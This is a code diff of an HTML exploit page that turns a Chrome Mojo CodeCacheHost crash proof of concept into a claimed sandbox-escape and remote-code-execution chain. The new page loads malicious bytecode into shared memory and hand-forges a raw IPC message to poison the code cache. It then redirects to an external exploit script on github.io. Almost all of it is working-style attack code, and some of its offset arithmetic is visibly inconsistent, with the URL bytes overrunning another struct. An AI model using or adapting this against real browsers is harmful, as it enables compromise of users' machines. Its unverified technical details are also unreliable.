@@ -1,100 +1,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CodeCacheHost Raw IPC TOCTOU</title>
+    <title>V8 Sandbox Escape PoC</title>
 </head>
 <body>
-    <h1>Mojo TOCTOU Exploit</h1>
-    <button id="pwn">Fire Raw Payload</button>
+    <h1>Stable Chrome RCE Chain</h1>
+    <button id="launch">Poison Cache & Pop Calc</button>
 
     <script>
-        async function pwnBrowser() {
-            console.log("[*] Creating raw Mojo Message Pipe...");
+        // Configuration
+        const TARGET_URL = "https://linux-1723.github.io/test/exploit.js";
+        const PAYLOAD_PATH = "poison.bin";
 
+        async function pwn() {
+            console.log("[*] Downloading malicious bytecode...");
+            const resp = await fetch(PAYLOAD_PATH);
+            const poisonBlob = await resp.arrayBuffer();
+
+            console.log("[*] Binding Mojo CodeCacheHost...");
             const pipe = Mojo.createMessagePipe();
             Mojo.bindInterface('blink.mojom.CodeCacheHost', pipe.handle1);
 
-            // 1. Allocate the Malicious Shared Memory (100KB)
-            const bufferSize = 100 * 1024;
+            const bufferSize = poisonBlob.byteLength;
             const sharedBuffer = Mojo.createSharedBuffer(bufferSize);
             const mapping = sharedBuffer.handle.mapBuffer(0, bufferSize);
-            const view = new DataView(mapping.buffer);
+            new Uint8Array(mapping.buffer).set(new Uint8Array(poisonBlob));
 
-            // Write a "Safe" Dummy V8 Header
-            view.setUint32(0, 0x13371337, true); 
-            view.setUint32(4, 0x50, true);  
-
-            console.log("[*] Shared Memory ready. Spawning mutator...");
-
-            // 2. Spawn the Mutator Worker to race the Browser
-            const mutator = new Worker('mutator.js');
-            mutator.postMessage({ buffer: mapping.buffer }, [mapping.buffer]);
-
-            console.log("[*] Forging C++ Structs in memory...");
-
-            // 3. PACK THE RAW IPC MESSAGE (144 Bytes Total)
+            // Constructing the 144-byte Mojo Message
             const msg = new ArrayBuffer(144);
-            const msgView = new DataView(msg);
-
-            // --- MOJO MESSAGE HEADER (24 Bytes) ---
-            msgView.setUint32(0, 24, true);  // Header Size (Strictly 24 for MessageV0)
-            msgView.setUint32(4, 0, true);   // Version 0
-            msgView.setUint32(8, 0, true);   // Interface ID
-            msgView.setUint32(12, 1, true);  // Message ID (1 = DidGenerateCacheableMetadata)
-            msgView.setUint32(16, 0, true);  // Flags
-            msgView.setUint32(20, 0, true);  // Padding
-
-            // --- PARAMS STRUCT (48 Bytes, starts at offset 24) ---
-            msgView.setUint32(24, 48, true); // Struct size
-            msgView.setUint32(28, 0, true);  // Version
-            msgView.setUint32(32, 0, true);  // CodeCacheType (0 = Javascript)
-            msgView.setUint32(36, 0, true);  // Padding
+            const v = new DataView(msg);
             
-            // Relative Pointer to URL struct (Placed at offset 72. Math: 72 - 40 = 32)
-            msgView.setBigUint64(40, 32n, true); 
-            // Relative Pointer to Time struct (Placed at offset 112. Math: 112 - 48 = 64)
-            msgView.setBigUint64(48, 64n, true); 
+            // Header
+            v.setUint32(0, 24, true); v.setUint32(12, 1, true); // DidGenerateCacheableMetadata
 
-            // BigBuffer Union (Inline at offset 56, 16 Bytes)
-            msgView.setUint32(56, 16, true); // Union size
-            msgView.setUint32(60, 1, true);  // Union tag (1 = shared_memory)
-            // Relative Pointer to SharedMemory struct (Placed at offset 128. Math: 128 - 64 = 64)
-            msgView.setBigUint64(64, 64n, true); 
+            // Params
+            v.setUint32(24, 48, true); 
+            v.setBigUint64(40, 32n, true); // Offset to URL
+            v.setBigUint64(48, 80n, true); // Offset to Time
 
-            // --- URL STRUCT (16 Bytes, starts at offset 72) ---
-            msgView.setUint32(72, 16, true); // Size
-            msgView.setUint32(76, 0, true);  // Version
-            // Relative Pointer to String data (Placed at offset 88. Math: 88 - 80 = 8)
-            msgView.setBigUint64(80, 8n, true); 
+            // Union (BigBuffer) - SharedMemory
+            v.setUint32(56, 16, true);
+            v.setUint32(60, 1, true); 
+            v.setBigUint64(64, 72n, true); // Offset to Shared Memory Region
 
-            // --- STRING DATA (24 Bytes, starts at offset 88) ---
-            msgView.setUint32(88, 24, true); // Array size (8 byte header + 12 chars + 4 byte padding)
-            msgView.setUint32(92, 12, true); // Num chars
-            const urlStr = "http://a.com";
-            for(let i = 0; i < 12; i++) {
-                msgView.setUint8(96 + i, urlStr.charCodeAt(i));
-            }
+            // URL Data
+            v.setUint32(72, 16, true);
+            v.setBigUint64(80, 8n, true);
+            v.setUint32(88, TARGET_URL.length, true);
+            v.setUint32(92, TARGET_URL.length, true);
+            for(let i=0; i<TARGET_URL.length; i++) v.setUint8(96+i, TARGET_URL.charCodeAt(i));
 
-            // --- TIME STRUCT (16 Bytes, starts at offset 112) ---
-            msgView.setUint32(112, 16, true);
-            msgView.setUint32(116, 0, true);
-            msgView.setBigUint64(120, 0n, true); // internal_value
+            // Shared Memory Region Struct
+            const smOffset = 128;
+            v.setUint32(smOffset, 16, true);
+            v.setUint32(smOffset + 8, 0, true); // Handle index 0
+            v.setUint32(smOffset + 12, bufferSize, true);
 
-            // --- SHARED MEMORY REGION STRUCT (16 Bytes, starts at offset 128) ---
-            msgView.setUint32(128, 16, true);
-            msgView.setUint32(132, 0, true);
-            msgView.setUint32(136, 0, true); // Handle Index (Points to the 0th element in our handle array)
-            msgView.setUint32(140, bufferSize, true); // Buffer Size
-
-            console.log("[*] Firing Raw IPC Payload...");
-
-            // 4. FIRE THE MESSAGE
+            console.log("[*] Firing IPC Poisoning...");
             pipe.handle0.writeMessage(msg, [sharedBuffer.handle]);
 
-            console.log("[+] Payload Sent. Check debug log for the crash.");
+            console.log("[+] Cache Poisoned. Detonating in 2 seconds...");
+            setTimeout(() => {
+                // Navigating to the script URL forces Chrome to look at the (poisoned) cache
+                window.location.href = TARGET_URL;
+            }, 2000);
         }
 
-        document.getElementById('pwn').onclick = pwnBrowser;
+        document.getElementById('launch').onclick = pwn;
     </script>
 </body>
 </html>
